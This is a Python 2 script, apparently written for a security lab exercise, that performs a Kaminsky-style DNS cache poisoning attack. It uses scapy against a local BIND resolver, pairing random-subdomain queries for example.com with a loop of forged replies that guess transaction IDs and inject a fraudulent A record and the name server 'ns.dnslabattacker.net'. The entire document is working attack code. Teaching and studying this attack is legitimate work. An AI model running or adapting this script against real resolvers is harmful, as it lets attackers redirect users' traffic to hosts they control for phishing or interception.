#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

dns_ip = "127.0.0.1"
request_domain = "example.com"

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096) # read at most 4096 bytes
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"


def sendDNSQuery(sock, query):
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=query))
    sendPacket(sock, dnsPacket, dns_ip, my_port)
    return

"""
    Spoof NS reply with attacker's IP and hostname
"""
def sendFakeReplies(query):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    spoofReply = DNS(
        qr=1,
        opcode=0,
        aa=1,
        tc=0,
        rd=1,
        ra=0,
        z=0,
        qd=DNSQR(qname=query, qtype="A"),
        # answer with fraudulent ip (exp. rrname='www.slashdot.org.' type=A rclass=IN ttl=3560L rdata='66.35.250.151')
        an=DNSRR(rrname=query, type="A", rclass="IN", ttl=3600, rdata="128.100.8.48"),
        # provide the fraudulent name server
        ns=DNSRR(rrname=request_domain, type="NS", rdata="ns.dnslabattacker.net")
    )
    print('Sending fake responses ...')
    for i in range(100):
        spoofReply[DNS].id = getRandomTXID()
        sendPacket(sock, spoofReply, dns_ip, my_port)
    return

if __name__ == '__main__':
    while True:
        query = getRandomSubDomain() + '.' + request_domain
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sendDNSQuery(sock, query)
        
        sendFakeReplies(query)

        print('Check for response from BIND')
        response = sock.recv(4096)
        response = DNS(response)
        print(response.show())
        if response[DNS].ns.rdata == 'ns.dnslabattacker.net':
            print("Success")
            break
